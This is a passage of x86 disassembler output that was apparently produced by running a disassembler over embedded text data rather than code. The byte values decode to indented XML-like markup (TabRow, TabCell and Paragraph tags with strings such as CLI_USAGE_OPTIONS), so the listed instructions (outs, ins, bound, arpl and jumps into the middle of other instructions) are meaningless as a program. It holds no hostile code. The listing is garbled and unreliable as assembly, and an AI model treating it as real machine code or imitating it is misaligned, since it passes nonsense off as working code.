11009106:	push   eax
11009107:	jb     0x11009178
11009109:	jo     0x11009170
1100910b:	jb     0x11009181
1100910d:	jns    0x1100914c
1100910f:	and    al,BYTE PTR [esi+0x6f]
11009112:	outs   dx,BYTE PTR ds:[esi]
11009113:	je     0x11009168
11009115:	imul   edi,DWORD PTR [edx+0x65],0x61562022
1100911c:	ins    BYTE PTR es:[edi],dx
1100911d:	jne    0x11009184
1100911f:	cmp    eax,0x22323122
11009124:	das    
11009125:	ds or  eax,0x2020200a
1100912b:	and    BYTE PTR [eax],ah
1100912d:	and    BYTE PTR [edi+ebp*1],bh
11009130:	push   ebx
11009131:	je     0x110091ac
11009133:	ins    BYTE PTR es:[edi],dx
11009134:	gs ds or eax,0x2020200a
1100913b:	and    BYTE PTR [edi+ebp*1],bh
1100913e:	push   esp
1100913f:	popa   
11009140:	bound  ebp,QWORD PTR [ebp+eiz*2+0x2e]
11009144:	push   edx
11009145:	gs jae 0x110091b7
11009148:	jne    0x110091bc
1100914a:	arpl   WORD PTR [ebp+0x73],sp
1100914d:	ds or  eax,0x200a0d0a
11009153:	and    BYTE PTR [eax],ah
11009155:	and    BYTE PTR [esp+edx*2],bh
11009158:	popa   
11009159:	bound  ebp,QWORD PTR [ebp+eiz*2+0x2e]
1100915d:	inc    ebx
1100915e:	outs   dx,DWORD PTR ds:[esi]
1100915f:	ins    BYTE PTR es:[edi],dx
11009160:	jne    0x110091cf
11009162:	outs   dx,BYTE PTR ds:[esi]
11009163:	jae    0x110091a3
11009165:	or     eax,0x2020200a
1100916a:	and    BYTE PTR [eax],ah
1100916c:	and    BYTE PTR [esp+edx*2],bh
1100916f:	popa   
11009170:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
11009174:	outs   dx,DWORD PTR ds:[esi]
11009175:	ins    BYTE PTR es:[edi],dx
11009176:	jne    0x110091e5
11009178:	outs   dx,BYTE PTR ds:[esi]
11009179:	and    BYTE PTR [edi+0x69],dl
1100917c:	fs je  0x110091e7
1100917f:	cmp    eax,0x2f222a22
11009184:	ds or  eax,0x2020200a
1100918a:	and    BYTE PTR [eax],ah
1100918c:	and    BYTE PTR [esp+edx*2],bh
1100918f:	popa   
11009190:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
11009194:	outs   dx,DWORD PTR ds:[esi]
11009195:	ins    BYTE PTR es:[edi],dx
11009196:	jne    0x11009205
11009198:	outs   dx,BYTE PTR ds:[esi]
11009199:	and    BYTE PTR [edi+0x69],dl
1100919c:	fs je  0x11009207
1100919f:	cmp    eax,0x222a3322
110091a4:	das    
110091a5:	ds or  eax,0x2020200a
110091ab:	and    BYTE PTR [edi+ebp*1],bh
110091ae:	push   esp
110091af:	popa   
110091b0:	bound  ebp,QWORD PTR [ebp+eiz*2+0x2e]
110091b4:	inc    ebx
110091b5:	outs   dx,DWORD PTR ds:[esi]
110091b6:	ins    BYTE PTR es:[edi],dx
110091b7:	jne    0x11009226
110091b9:	outs   dx,BYTE PTR ds:[esi]
110091ba:	jae    0x110091fa
110091bc:	or     eax,0x2020200a
110091c1:	and    BYTE PTR [esp+edx*2],bh
110091c4:	popa   
110091c5:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
110091c9:	outs   dx,DWORD PTR ds:[esi]
110091ca:	ja     0x11009213
110091cc:	jb     0x1100923d
110091ce:	jne    0x11009240
110091d0:	and    BYTE PTR [ebx+0x74],dl
110091d3:	jns    0x11009241
110091d5:	gs cmp eax,0x74537b22
110091db:	popa   
110091dc:	je     0x11009247
110091de:	arpl   WORD PTR [edx+0x65],dx
110091e1:	jae    0x11009252
110091e3:	jne    0x11009257
110091e5:	arpl   WORD PTR [ebp+0x20],sp
110091e8:	push   0x65646165
110091ed:	jb     0x11009235
110091ef:	outs   dx,DWORD PTR ds:[esi]
110091f0:	outs   dx,DWORD PTR ds:[esi]
110091f1:	je     0x11009258
110091f3:	jb     0x11009247
110091f5:	outs   dx,DWORD PTR ds:[esi]
110091f6:	ja     0x1100924b
110091f8:	je     0x11009273
110091fa:	ins    BYTE PTR es:[edi],dx
110091fb:	gs jge 0x11009220
110091fe:	ds or  eax,0x2020200a
11009204:	and    BYTE PTR [eax],ah
11009206:	and    BYTE PTR [esp+edx*2],bh
11009209:	popa   
1100920a:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100920e:	outs   dx,DWORD PTR ds:[esi]
1100920f:	ja     0x1100924f
11009211:	or     eax,0x2020200a
11009216:	and    BYTE PTR [eax],ah
11009218:	and    BYTE PTR [eax],ah
1100921a:	and    BYTE PTR [esp+edx*2],bh
1100921d:	popa   
1100921e:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
11009222:	gs ins BYTE PTR es:[edi],dx
11009224:	ins    BYTE PTR es:[edi],dx
11009225:	ds or  eax,0x2020200a
1100922b:	and    BYTE PTR [eax],ah
1100922d:	and    BYTE PTR [eax],ah
1100922f:	and    BYTE PTR [eax],ah
11009231:	and    BYTE PTR [eax+edx*2],bh
11009234:	popa   
11009235:	jb     0x11009298
11009237:	addr16 jb 0x1100929b
1100923a:	jo     0x110092a4
1100923c:	ds inc ebx
1100923e:	dec    esp
1100923f:	dec    ecx
11009240:	pop    edi
11009241:	push   ebp
11009242:	push   ebx
11009243:	inc    ecx
11009244:	inc    edi
11009245:	inc    ebp
11009246:	pop    edi
11009247:	dec    edi
11009248:	push   eax
11009249:	push   esp
1100924a:	dec    ecx
1100924b:	dec    edi
1100924c:	dec    esi
1100924d:	push   ebx
1100924e:	cmp    al,0x2f
11009250:	push   eax
11009251:	popa   
11009252:	jb     0x110092b5
11009254:	addr16 jb 0x110092b8
11009257:	jo     0x110092c1
11009259:	ds or  eax,0x2020200a
1100925f:	and    BYTE PTR [eax],ah
11009261:	and    BYTE PTR [eax],ah
11009263:	and    BYTE PTR [edi+ebp*1],bh
11009266:	push   esp
11009267:	popa   
11009268:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100926c:	gs ins BYTE PTR es:[edi],dx
1100926e:	ins    BYTE PTR es:[edi],dx
1100926f:	ds or  eax,0x2020200a
11009275:	and    BYTE PTR [eax],ah
11009277:	and    BYTE PTR [eax],ah
11009279:	and    BYTE PTR [esp+edx*2],bh
1100927c:	popa   
1100927d:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
11009281:	gs ins BYTE PTR es:[edi],dx
11009283:	ins    BYTE PTR es:[edi],dx
11009284:	ds or  eax,0x2020200a
1100928a:	and    BYTE PTR [eax],ah
1100928c:	and    BYTE PTR [eax],ah
1100928e:	and    BYTE PTR [eax],ah
11009290:	and    BYTE PTR [eax+edx*2],bh
11009293:	popa   
11009294:	jb     0x110092f7
11009296:	addr16 jb 0x110092fa
11009299:	jo     0x11009303
1100929b:	ds inc ebx
1100929d:	dec    esp
1100929e:	dec    ecx
1100929f:	pop    edi
110092a0:	push   ebp
110092a1:	push   ebx
110092a2:	inc    ecx
110092a3:	inc    edi
110092a4:	inc    ebp
110092a5:	pop    edi
110092a6:	inc    esp
110092a7:	inc    ebp
110092a8:	push   ebx
110092a9:	inc    ebx
110092aa:	push   edx
110092ab:	dec    ecx
110092ac:	push   eax
110092ad:	push   esp
110092ae:	dec    ecx
110092af:	dec    edi
110092b0:	dec    esi
110092b1:	cmp    al,0x2f
110092b3:	push   eax
110092b4:	popa   
110092b5:	jb     0x11009318
110092b7:	addr16 jb 0x1100931b
110092ba:	jo     0x11009324
110092bc:	ds or  eax,0x2020200a
110092c2:	and    BYTE PTR [eax],ah
110092c4:	and    BYTE PTR [eax],ah
110092c6:	and    BYTE PTR [edi+ebp*1],bh
110092c9:	push   esp
110092ca:	popa   
110092cb:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
110092cf:	gs ins BYTE PTR es:[edi],dx
110092d1:	ins    BYTE PTR es:[edi],dx
110092d2:	ds or  eax,0x2020200a
110092d8:	and    BYTE PTR [eax],ah
110092da:	and    BYTE PTR [edi+ebp*1],bh
110092dd:	push   esp
110092de:	popa   
110092df:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
110092e3:	outs   dx,DWORD PTR ds:[esi]
110092e4:	ja     0x11009324
110092e6:	or     eax,0x2020200a
110092eb:	and    BYTE PTR [edi+ebp*1],bh
110092ee:	push   esp
110092ef:	popa   
110092f0:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
110092f4:	outs   dx,DWORD PTR ds:[esi]
110092f5:	ja     0x1100933e
110092f7:	jb     0x11009368
110092f9:	jne    0x1100936b
110092fb:	ds or  eax,0x2020200a
11009301:	and    BYTE PTR [esp+edx*2],bh
11009304:	popa   
11009305:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
11009309:	outs   dx,DWORD PTR ds:[esi]
1100930a:	ja     0x11009353
1100930c:	jb     0x1100937d
1100930e:	jne    0x11009380
11009310:	and    BYTE PTR [ebx+0x74],dl
11009313:	jns    0x11009381
11009315:	gs cmp eax,0x74537b22
1100931b:	popa   
1100931c:	je     0x11009387
1100931e:	arpl   WORD PTR [edx+0x65],dx
11009321:	jae    0x11009392
11009323:	jne    0x11009397
11009325:	arpl   WORD PTR [ebp+0x20],sp
11009328:	fs popa 
1100932a:	je     0x1100938d
1100932c:	push   edx
1100932d:	outs   dx,DWORD PTR ds:[esi]
1100932e:	ja     0x11009383
11009330:	je     0x110093ab
11009332:	ins    BYTE PTR es:[edi],dx
11009333:	gs jge 0x11009358
11009336:	ds or  eax,0x2020200a
1100933c:	and    BYTE PTR [eax],ah
1100933e:	and    BYTE PTR [esp+edx*2],bh
11009341:	popa   
11009342:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
11009346:	outs   dx,DWORD PTR ds:[esi]
11009347:	ja     0x11009387
11009349:	or     eax,0x2020200a
1100934e:	and    BYTE PTR [eax],ah
11009350:	and    BYTE PTR [eax],ah
11009352:	and    BYTE PTR [esp+edx*2],bh
11009355:	popa   
11009356:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100935a:	gs ins BYTE PTR es:[edi],dx
1100935c:	ins    BYTE PTR es:[edi],dx
1100935d:	ds or  eax,0x2020200a
11009363:	and    BYTE PTR [eax],ah
11009365:	and    BYTE PTR [eax],ah
11009367:	and    BYTE PTR [eax],ah
11009369:	and    BYTE PTR [eax+edx*2],bh
1100936c:	popa   
1100936d:	jb     0x110093d0
1100936f:	addr16 jb 0x110093d3
11009372:	jo     0x110093dc
11009374:	and    BYTE PTR [esi+0x6f],al
11009377:	jb     0x110093de
11009379:	addr16 jb 0x110093eb
1100937c:	jne    0x110093ec
1100937e:	fs cmp eax,0x756c4222
11009384:	and    bh,BYTE PTR gs:[esi]
11009387:	inc    ebx
11009388:	dec    esp
11009389:	dec    ecx
1100938a:	pop    edi
1100938b:	push   ebp
1100938c:	push   ebx
1100938d:	inc    ecx
1100938e:	inc    edi
1100938f:	inc    ebp
11009390:	pop    edi
11009391:	inc    edi
11009392:	pop    edi
11009393:	dec    edi
11009394:	push   eax
11009395:	push   esp
11009396:	dec    ecx
11009397:	dec    edi
11009398:	dec    esi
11009399:	cmp    al,0x2f
1100939b:	push   eax
1100939c:	popa   
1100939d:	jb     0x11009400
1100939f:	addr16 jb 0x11009403
110093a2:	jo     0x1100940c
110093a4:	ds or  eax,0x2020200a
110093aa:	and    BYTE PTR [eax],ah
110093ac:	and    BYTE PTR [eax],ah
110093ae:	and    BYTE PTR [edi+ebp*1],bh
110093b1:	push   esp
110093b2:	popa   
110093b3:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
110093b7:	gs ins BYTE PTR es:[edi],dx
110093b9:	ins    BYTE PTR es:[edi],dx
110093ba:	ds or  eax,0x2020200a
110093c0:	and    BYTE PTR [eax],ah
110093c2:	and    BYTE PTR [eax],ah
110093c4:	and    BYTE PTR [esp+edx*2],bh
110093c7:	popa   
110093c8:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
110093cc:	gs ins BYTE PTR es:[edi],dx
110093ce:	ins    BYTE PTR es:[edi],dx
110093cf:	ds or  eax,0x2020200a
110093d5:	and    BYTE PTR [eax],ah
110093d7:	and    BYTE PTR [eax],ah
110093d9:	and    BYTE PTR [eax],ah
110093db:	and    BYTE PTR [eax+edx*2],bh
110093de:	popa   
110093df:	jb     0x11009442
110093e1:	addr16 jb 0x11009445
110093e4:	jo     0x1100944e
110093e6:	ds inc ebx
110093e8:	dec    esp
110093e9:	dec    ecx
110093ea:	pop    edi
110093eb:	push   ebp
110093ec:	push   ebx
110093ed:	inc    ecx
110093ee:	inc    edi
110093ef:	inc    ebp
110093f0:	pop    edi
110093f1:	inc    edi
110093f2:	pop    edi
110093f3:	dec    edi
110093f4:	push   eax
110093f5:	push   esp
110093f6:	dec    ecx
110093f7:	dec    edi
110093f8:	dec    esi
110093f9:	pop    edi
110093fa:	inc    esp
110093fb:	inc    ebp
110093fc:	push   ebx
110093fd:	inc    ebx
110093fe:	cmp    al,0x2f
11009400:	push   eax
11009401:	popa   
11009402:	jb     0x11009465
11009404:	addr16 jb 0x11009468
11009407:	jo     0x11009471
11009409:	ds or  eax,0x2020200a
1100940f:	and    BYTE PTR [eax],ah
11009411:	and    BYTE PTR [eax],ah
11009413:	and    BYTE PTR [edi+ebp*1],bh
11009416:	push   esp
11009417:	popa   
11009418:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100941c:	gs ins BYTE PTR es:[edi],dx
1100941e:	ins    BYTE PTR es:[edi],dx
1100941f:	ds or  eax,0x2020200a
11009425:	and    BYTE PTR [eax],ah
11009427:	and    BYTE PTR [edi+ebp*1],bh
1100942a:	push   esp
1100942b:	popa   
1100942c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
11009430:	outs   dx,DWORD PTR ds:[esi]
11009431:	ja     0x11009471
11009433:	or     eax,0x2020200a
11009438:	and    BYTE PTR [eax],ah
1100943a:	and    BYTE PTR ds:0x2020200a,cl
11009440:	and    BYTE PTR [eax],ah
11009442:	and    BYTE PTR [esp+edx*2],bh
11009445:	popa   
11009446:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100944a:	outs   dx,DWORD PTR ds:[esi]
1100944b:	ja     0x1100948b
1100944d:	or     eax,0x2020200a
11009452:	and    BYTE PTR [eax],ah
11009454:	and    BYTE PTR [eax],ah
11009456:	and    BYTE PTR [esp+edx*2],bh
11009459:	popa   
1100945a:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100945e:	gs ins BYTE PTR es:[edi],dx
11009460:	ins    BYTE PTR es:[edi],dx
11009461:	ds or  eax,0x2020200a
11009467:	and    BYTE PTR [eax],ah
11009469:	and    BYTE PTR [eax],ah
1100946b:	and    BYTE PTR [eax],ah
1100946d:	and    BYTE PTR [eax+edx*2],bh
11009470:	popa   
11009471:	jb     0x110094d4
11009473:	addr16 jb 0x110094d7
11009476:	jo     0x110094e0
11009478:	and    BYTE PTR [esi+0x6f],al
1100947b:	jb     0x110094e2
1100947d:	addr16 jb 0x110094ef
11009480:	jne    0x110094f0
11009482:	fs cmp eax,0x756c4222
11009488:	and    bh,BYTE PTR gs:[esi]
1100948b:	inc    ebx
1100948c:	dec    esp
1100948d:	dec    ecx
1100948e:	pop    edi
1100948f:	push   ebp
11009490:	push   ebx
11009491:	inc    ecx
11009492:	inc    edi
11009493:	inc    ebp
11009494:	pop    edi
11009495:	dec    ecx
11009496:	pop    edi
11009497:	dec    edi
11009498:	push   eax
11009499:	push   esp
1100949a:	dec    ecx
1100949b:	dec    edi
1100949c:	dec    esi
1100949d:	cmp    al,0x2f
1100949f:	push   eax
110094a0:	popa   
110094a1:	jb     0x11009504
110094a3:	addr16 jb 0x11009507
110094a6:	jo     0x11009510
110094a8:	ds or  eax,0x2020200a
110094ae:	and    BYTE PTR [eax],ah
110094b0:	and    BYTE PTR [eax],ah
110094b2:	and    BYTE PTR [edi+ebp*1],bh
110094b5:	push   esp
110094b6:	popa   
110094b7:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
110094bb:	gs ins BYTE PTR es:[edi],dx
110094bd:	ins    BYTE PTR es:[edi],dx
110094be:	ds or  eax,0x2020200a
110094c4:	and    BYTE PTR [eax],ah
110094c6:	and    BYTE PTR [eax],ah
110094c8:	and    BYTE PTR [esp+edx*2],bh
110094cb:	popa   
110094cc:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
110094d0:	gs ins BYTE PTR es:[edi],dx
110094d2:	ins    BYTE PTR es:[edi],dx
110094d3:	ds or  eax,0x2020200a
110094d9:	and    BYTE PTR [eax],ah
110094db:	and    BYTE PTR [eax],ah
110094dd:	and    BYTE PTR [eax],ah
110094df:	and    BYTE PTR [eax+edx*2],bh
110094e2:	popa   
110094e3:	jb     0x11009546
110094e5:	addr16 jb 0x11009549
110094e8:	jo     0x11009552
110094ea:	ds inc ebx
110094ec:	dec    esp
110094ed:	dec    ecx
110094ee:	pop    edi
110094ef:	push   ebp
110094f0:	push   ebx
110094f1:	inc    ecx
110094f2:	inc    edi
110094f3:	inc    ebp
110094f4:	pop    edi
110094f5:	dec    ecx
110094f6:	pop    edi
110094f7:	dec    edi
110094f8:	push   eax
110094f9:	push   esp
110094fa:	dec    ecx
110094fb:	dec    edi
110094fc:	dec    esi
110094fd:	pop    edi
110094fe:	inc    esp
110094ff:	inc    ebp
11009500:	push   ebx
11009501:	inc    ebx
11009502:	cmp    al,0x2f
11009504:	push   eax
11009505:	popa   
11009506:	jb     0x11009569
11009508:	addr16 jb 0x1100956c
1100950b:	jo     0x11009575
1100950d:	ds or  eax,0x2020200a
11009513:	and    BYTE PTR [eax],ah
11009515:	and    BYTE PTR [eax],ah
11009517:	and    BYTE PTR [edi+ebp*1],bh
1100951a:	push   esp
1100951b:	popa   
1100951c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
11009520:	gs ins BYTE PTR es:[edi],dx
11009522:	ins    BYTE PTR es:[edi],dx
11009523:	ds or  eax,0x2020200a
11009529:	and    BYTE PTR [eax],ah
1100952b:	and    BYTE PTR [edi+ebp*1],bh
1100952e:	push   esp
1100952f:	popa   
11009530:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
11009534:	outs   dx,DWORD PTR ds:[esi]
11009535:	ja     0x11009575
11009537:	or     eax,0x200a0d0a
1100953c:	and    BYTE PTR [eax],ah
1100953e:	and    BYTE PTR [eax],ah
11009540:	and    BYTE PTR [esp+edx*2],bh
11009543:	popa   
11009544:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
11009548:	outs   dx,DWORD PTR ds:[esi]
11009549:	ja     0x11009589
1100954b:	or     eax,0x2020200a
11009550:	and    BYTE PTR [eax],ah
11009552:	and    BYTE PTR [eax],ah
11009554:	and    BYTE PTR [esp+edx*2],bh
11009557:	popa   
11009558:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100955c:	gs ins BYTE PTR es:[edi],dx
1100955e:	ins    BYTE PTR es:[edi],dx
1100955f:	ds or  eax,0x2020200a
11009565:	and    BYTE PTR [eax],ah
11009567:	and    BYTE PTR [eax],ah
11009569:	and    BYTE PTR [eax],ah
1100956b:	and    BYTE PTR [eax+edx*2],bh
1100956e:	popa   
1100956f:	jb     0x110095d2
11009571:	addr16 jb 0x110095d5
11009574:	jo     0x110095de
11009576:	and    BYTE PTR [esi+0x6f],al
11009579:	jb     0x110095e0
1100957b:	addr16 jb 0x110095ed
1100957e:	jne    0x110095ee
11009580:	fs cmp eax,0x756c4222
11009586:	and    bh,BYTE PTR gs:[esi]
11009589:	inc    ebx
1100958a:	dec    esp
1100958b:	dec    ecx
1100958c:	pop    edi
1100958d:	push   ebp
1100958e:	push   ebx
1100958f:	inc    ecx
11009590:	inc    edi
11009591:	inc    ebp
11009592:	pop    edi
11009593:	push   eax
11009594:	pop    edi
11009595:	dec    edi
11009596:	push   eax
11009597:	push   esp
11009598:	dec    ecx
11009599:	dec    edi
1100959a:	dec    esi
1100959b:	cmp    al,0x2f
1100959d:	push   eax
1100959e:	popa   
1100959f:	jb     0x11009602
110095a1:	addr16 jb 0x11009605
110095a4:	jo     0x1100960e
110095a6:	ds or  eax,0x2020200a
110095ac:	and    BYTE PTR [eax],ah
110095ae:	and    BYTE PTR [eax],ah
110095b0:	and    BYTE PTR [edi+ebp*1],bh
110095b3:	push   esp
110095b4:	popa   
110095b5:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
110095b9:	gs ins BYTE PTR es:[edi],dx
110095bb:	ins    BYTE PTR es:[edi],dx
110095bc:	ds or  eax,0x2020200a
110095c2:	and    BYTE PTR [eax],ah
110095c4:	and    BYTE PTR [eax],ah
110095c6:	and    BYTE PTR [esp+edx*2],bh
110095c9:	popa   
110095ca:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
110095ce:	gs ins BYTE PTR es:[edi],dx
110095d0:	ins    BYTE PTR es:[edi],dx
110095d1:	ds or  eax,0x2020200a
110095d7:	and    BYTE PTR [eax],ah
110095d9:	and    BYTE PTR [eax],ah
110095db:	and    BYTE PTR [eax],ah
110095dd:	and    BYTE PTR [eax+edx*2],bh
110095e0:	popa   
110095e1:	jb     0x11009644
110095e3:	addr16 jb 0x11009647
110095e6:	jo     0x11009650
110095e8:	ds inc ebx
110095ea:	dec    esp
110095eb:	dec    ecx
110095ec:	pop    edi
110095ed:	push   ebp
110095ee:	push   ebx
110095ef:	inc    ecx
110095f0:	inc    edi
110095f1:	inc    ebp
110095f2:	pop    edi
110095f3:	push   eax
110095f4:	pop    edi
110095f5:	dec    edi
110095f6:	push   eax
110095f7:	push   esp
110095f8:	dec    ecx
110095f9:	dec    edi
110095fa:	dec    esi
110095fb:	pop    edi
110095fc:	inc    esp
110095fd:	inc    ebp
110095fe:	push   ebx
110095ff:	inc    ebx
11009600:	cmp    al,0x2f
11009602:	push   eax
11009603:	popa   
11009604:	jb     0x11009667
11009606:	addr16 jb 0x1100966a
11009609:	jo     0x11009673
1100960b:	ds or  eax,0x2020200a
11009611:	and    BYTE PTR [eax],ah
11009613:	and    BYTE PTR [eax],ah
11009615:	and    BYTE PTR [eax],ah
11009617:	and    BYTE PTR [eax+edx*2],bh
1100961a:	popa   
1100961b:	jb     0x1100967e
1100961d:	addr16 jb 0x11009681
11009620:	jo     0x1100968a
11009622:	ds inc ebx
11009624:	dec    esp
11009625:	dec    ecx
11009626:	pop    edi
11009627:	push   ebp
11009628:	push   ebx
11009629:	inc    ecx
1100962a:	inc    edi
1100962b:	inc    ebp
1100962c:	pop    edi
1100962d:	push   eax
1100962e:	pop    edi
1100962f:	dec    edi
11009630:	push   eax
11009631:	push   esp
11009632:	dec    ecx
11009633:	dec    edi
11009634:	dec    esi
11009635:	pop    edi
11009636:	inc    ebp
11009637:	pop    eax
11009638:	inc    ecx
11009639:	dec    ebp
1100963a:	push   eax
1100963b:	dec    esp
1100963c:	inc    ebp
1100963d:	cmp    al,0x2f
1100963f:	push   eax
11009640:	popa   
11009641:	jb     0x110096a4
11009643:	addr16 jb 0x110096a7
11009646:	jo     0x110096b0
11009648:	ds or  eax,0x2020200a
1100964e:	and    BYTE PTR [eax],ah
11009650:	and    BYTE PTR [eax],ah
11009652:	and    BYTE PTR [edi+ebp*1],bh
11009655:	push   esp
11009656:	popa   
11009657:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100965b:	gs ins BYTE PTR es:[edi],dx
1100965d:	ins    BYTE PTR es:[edi],dx
1100965e:	ds or  eax,0x2020200a
11009664:	and    BYTE PTR [eax],ah
11009666:	and    BYTE PTR [edi+ebp*1],bh
11009669:	push   esp
1100966a:	popa   
1100966b:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100966f:	outs   dx,DWORD PTR ds:[esi]
11009670:	ja     0x110096b0
11009672:	or     eax,0x200a0d0a
11009677:	and    BYTE PTR [eax],ah
11009679:	and    BYTE PTR [eax],ah
1100967b:	and    BYTE PTR [esp+edx*2],bh
1100967e:	popa   
1100967f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
11009683:	outs   dx,DWORD PTR ds:[esi]
11009684:	ja     0x110096c4
11009686:	or     eax,0x2020200a
1100968b:	and    BYTE PTR [eax],ah
1100968d:	and    BYTE PTR [eax],ah
1100968f:	and    BYTE PTR [esp+edx*2],bh
11009692:	popa   
11009693:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
11009697:	gs ins BYTE PTR es:[edi],dx
11009699:	ins    BYTE PTR es:[edi],dx
1100969a:	ds or  eax,0x2020200a
110096a0:	and    BYTE PTR [eax],ah
110096a2:	and    BYTE PTR [eax],ah
110096a4:	and    BYTE PTR [eax],ah
110096a6:	and    BYTE PTR [eax+edx*2],bh
110096a9:	popa   
110096aa:	jb     0x1100970d
110096ac:	addr16 jb 0x11009710
110096af:	jo     0x11009719
110096b1:	and    BYTE PTR [esi+0x6f],al
110096b4:	jb     0x1100971b
110096b6:	addr16 jb 0x11009728
110096b9:	jne    0x11009729
110096bb:	fs cmp eax,0x756c4222
110096c1:	and    bh,BYTE PTR gs:[esi]
110096c4:	inc    ebx
110096c5:	dec    esp
110096c6:	dec    ecx
110096c7:	pop    edi
110096c8:	push   ebp
110096c9:	push   ebx
110096ca:	inc    ecx
110096cb:	inc    edi
110096cc:	inc    ebp
110096cd:	pop    edi
110096ce:	push   ecx
110096cf:	pop    edi
110096d0:	dec    edi
110096d1:	push   eax
110096d2:	push   esp
110096d3:	dec    ecx
110096d4:	dec    edi
110096d5:	dec    esi
110096d6:	cmp    al,0x2f
110096d8:	push   eax
110096d9:	popa   
110096da:	jb     0x1100973d
110096dc:	addr16 jb 0x11009740
110096df:	jo     0x11009749
110096e1:	ds or  eax,0x2020200a
110096e7:	and    BYTE PTR [eax],ah
110096e9:	and    BYTE PTR [eax],ah
110096eb:	and    BYTE PTR [edi+ebp*1],bh
110096ee:	push   esp
110096ef:	popa   
110096f0:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
110096f4:	gs ins BYTE PTR es:[edi],dx
110096f6:	ins    BYTE PTR es:[edi],dx
110096f7:	ds or  eax,0x2020200a
110096fd:	and    BYTE PTR [eax],ah
110096ff:	and    BYTE PTR [eax],ah
11009701:	and    BYTE PTR [esp+edx*2],bh
11009704:	popa   
11009705:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
11009709:	gs ins BYTE PTR es:[edi],dx
1100970b:	ins    BYTE PTR es:[edi],dx
1100970c:	ds or  eax,0x2020200a
11009712:	and    BYTE PTR [eax],ah
11009714:	and    BYTE PTR [eax],ah
11009716:	and    BYTE PTR [eax],ah
11009718:	and    BYTE PTR [eax+edx*2],bh
1100971b:	popa   
1100971c:	jb     0x1100977f
1100971e:	addr16 jb 0x11009782
11009721:	jo     0x1100978b
11009723:	ds or  eax,0x2020200a
11009729:	and    BYTE PTR [eax],ah
1100972b:	and    BYTE PTR [eax],ah
1100972d:	and    BYTE PTR [eax],ah
1100972f:	and    BYTE PTR [eax],ah
11009731:	and    BYTE PTR [ebx+0x4c],al
11009734:	dec    ecx
11009735:	pop    edi
11009736:	push   ebp
11009737:	push   ebx
11009738:	inc    ecx
11009739:	inc    edi
1100973a:	inc    ebp
1100973b:	pop    edi
1100973c:	push   ecx
1100973d:	pop    edi
1100973e:	dec    edi
1100973f:	push   eax
11009740:	push   esp
11009741:	dec    ecx
11009742:	dec    edi
11009743:	dec    esi
11009744:	pop    edi
11009745:	inc    esp
11009746:	inc    ebp
11009747:	push   ebx
11009748:	inc    ebx
11009749:	or     eax,0x2020200a
1100974e:	and    BYTE PTR [eax],ah
11009750:	and    BYTE PTR [eax],ah
11009752:	and    BYTE PTR [eax],ah
11009754:	and    BYTE PTR [edi+ebp*1],bh
11009757:	push   eax
11009758:	popa   
11009759:	jb     0x110097bc
1100975b:	addr16 jb 0x110097bf
1100975e:	jo     0x110097c8
11009760:	ds or  eax,0x2020200a
11009766:	and    BYTE PTR [eax],ah
11009768:	and    BYTE PTR [eax],ah
1100976a:	and    BYTE PTR [edi+ebp*1],bh
1100976d:	push   esp
1100976e:	popa   
1100976f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
11009773:	gs ins BYTE PTR es:[edi],dx
11009775:	ins    BYTE PTR es:[edi],dx
11009776:	ds or  eax,0x2020200a
1100977c:	and    BYTE PTR [eax],ah
1100977e:	and    BYTE PTR [edi+ebp*1],bh
11009781:	push   esp
11009782:	popa   
11009783:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
11009787:	outs   dx,DWORD PTR ds:[esi]
11009788:	ja     0x110097c8
1100978a:	or     eax,0x200a0d0a
1100978f:	and    BYTE PTR [eax],ah
11009791:	and    BYTE PTR [eax],ah
11009793:	and    BYTE PTR [esp+edx*2],bh
11009796:	popa   
11009797:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100979b:	outs   dx,DWORD PTR ds:[esi]
1100979c:	ja     0x110097dc
1100979e:	or     eax,0x2020200a
110097a3:	and    BYTE PTR [eax],ah
110097a5:	and    BYTE PTR [eax],ah
110097a7:	and    BYTE PTR [esp+edx*2],bh
110097aa:	popa   
110097ab:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
110097af:	gs ins BYTE PTR es:[edi],dx
110097b1:	ins    BYTE PTR es:[edi],dx
110097b2:	ds or  eax,0x2020200a
110097b8:	and    BYTE PTR [eax],ah
110097ba:	and    BYTE PTR [eax],ah
110097bc:	and    BYTE PTR [eax],ah
110097be:	and    BYTE PTR [eax+edx*2],bh
110097c1:	popa   
110097c2:	jb     0x11009825
110097c4:	addr16 jb 0x11009828
110097c7:	jo     0x11009831
110097c9:	and    BYTE PTR [esi+0x6f],al
110097cc:	jb     0x11009833
110097ce:	addr16 jb 0x11009840
